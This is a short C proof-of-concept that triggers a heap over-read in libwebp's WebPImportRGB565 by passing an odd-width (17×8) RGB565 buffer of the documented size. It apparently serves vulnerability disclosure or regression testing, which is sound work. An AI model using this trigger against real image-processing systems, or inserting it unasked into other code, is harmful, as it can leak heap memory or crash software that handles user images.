// PoC: WebPImportRGB565 heap over-read on odd-width pictures.
// In-contract use of the public extras API: a width*height RGB565 image
// supplied as exactly 2*width*height bytes.
#include <stdlib.h>
#include <string.h>
#include "extras/extras.h"
#include "webp/encode.h"

int main(void) {
  const int width = 17;   // odd width triggers the tail over-read
  const int height = 8;
  WebPPicture pic;
  if (!WebPPictureInit(&pic)) return 2;
  pic.width = width;
  pic.height = height;

  const size_t n = (size_t)2 * width * height;  // documented buffer size
  uint8_t* rgb565 = (uint8_t*)malloc(n);
  if (rgb565 == NULL) return 2;
  memset(rgb565, 0xA5, n);

  const int ok = WebPImportRGB565(rgb565, &pic);
  WebPPictureFree(&pic);
  free(rgb565);
  return ok ? 0 : 1;
}
